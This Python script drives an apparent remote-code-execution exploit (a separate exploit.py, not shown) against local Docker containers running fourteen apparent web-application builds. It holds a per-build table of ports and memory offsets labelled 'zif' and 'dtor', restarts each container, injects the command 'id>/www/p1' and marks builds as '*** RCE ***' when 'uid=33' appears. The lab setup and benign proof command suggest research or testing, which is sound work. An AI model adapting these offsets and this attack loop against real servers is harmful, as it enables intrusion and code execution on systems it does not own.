import subprocess, sys, time
BASE = r"C:\Users\likat\p2s52704"
VERS = {
    "p2s5445": ("18101", "0x2f2e20", "0x3cd750"),
    "p2s5538": ("18102", "0x357e70", "0x438b80"),
    "p2s5640": ("18103", "0x378e80", "0x466920"),
    "p2s7033": ("18104", "0x3948d0", "0x47b7b0"),
    "p2s7133": ("18105", "0x300420", "0x3e6f60"),
    "p2s7234": ("18106", "0x3624e0", "0x451010"),
    "p2s7333": ("18107", "0x35f640", "0x440dc0"),
    "p2s7433": ("18108", "0x335850", "0x417d60"),
    "p2s8030": ("18109", "0x3495d0", "0x4319a0"),
    "p2s8132": ("18110", "0x36b080", "0x450690"),
    "p2s8234": ("18111", "0x39b8a0", "0x487650"),
    "p2s8335": ("18112", "0x3ac080", "0x49ec50"),
    "p2s8426": ("18113", "0x465370", "0x65eb60"),
    "p2s8511": ("18114", "0x5996e0", "0x7b47a0"),
}

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def attempt(c, port, zif, dtor, retries):
    # clear old proof, fresh heap
    sh(f'docker exec {c} rm -f /www/p1 2>/dev/null')
    sh(f'docker restart {c}')
    time.sleep(2)
    cmd = ["python", BASE + r"\exploit.py",
           "-u", f"http://127.0.0.1:{port}/index.php",
           "--profile", "bookworm",
           "--zif-offset", zif, "--dtor-offset", dtor,
           "--retries", str(retries),
           "-c", "id>/www/p1", "--fetch", "/p1"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=240)
        out = (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        out = "TIMEOUT"
    proof_ok = "uid=33" in out
    if proof_ok:
        # read the fresh proof file
        p = sh(f'docker exec {c} cat /www/p1')
        proof = p.stdout.strip()
    else:
        proof = ""
    return proof_ok, out, proof

def main():
    only = sys.argv[1:] if len(sys.argv) > 1 else None
    maxr = int(sys.argv[2]) if len(sys.argv) > 2 else 8
    import threading
    results = {}
    lock = threading.Lock()
    def worker(c):
        port, zif, dtor = VERS[c]
        for i in range(maxr):
            ok, out, proof = attempt(c, port, zif, dtor, 3)
            if ok:
                with lock:
                    results[c] = (True, f"try {i+1}", proof)
                break
            time.sleep(0.5)
        else:
            with lock:
                results[c] = (False, f"{maxr} tries failed", out[-300:])
    threads = []
    for c in VERS:
        if only and c not in only:
            continue
        t = threading.Thread(target=worker, args=(c,))
        threads.append(t)
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print("="*60)
    for c in sorted(VERS):
        if c in results:
            ok, info, proof = results[c]
            line = f"{c:10s} {'*** RCE ***' if ok else 'no RCE'}  ({info})"
            if ok:
                line += "  proof: " + proof.replace("\n", " | ")[:80]
            print(line)
        else:
            print(f"{c:10s} (skipped)")

if __name__ == "__main__":
    main()
